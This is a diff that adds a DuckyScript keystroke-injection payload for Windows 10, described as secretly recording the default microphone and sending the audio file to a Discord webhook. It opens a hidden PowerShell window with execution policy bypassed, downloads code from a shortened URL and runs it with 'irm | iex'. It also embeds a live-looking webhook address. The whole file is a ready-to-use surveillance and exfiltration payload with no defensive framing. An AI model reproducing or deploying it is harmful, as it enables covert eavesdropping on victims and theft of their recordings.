@@ -1,0 +1,18 @@
+REM Title: Record Microphone to Discord
+REM Author: @beigeworm
+REM Description: This script finds the default microphone and records for a specified time to a mp3 file, then sends the file to a discord webhook.
+REM Target: Windows 10
+
+REM Replace https://discord.com/api/webhooks/1410018293443461222/5cdHiZAcsk66wLqLqf6-TElmmSA73BB2fW7CS_Jam4-Sw_Y6Cg9mYeBtu9Y2EnwW0ahF with your Discord webhook URL
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc = 'https://discord.com/api/webhooks/1410018293443461222/5cdHiZAcsk66wLqLqf6-TElmmSA73BB2fW7CS_Jam4-Sw_Y6Cg9mYeBtu9Y2EnwW0ahF' ; irm is.gd/FNxNJ2 | iex
+ENTER
+
+
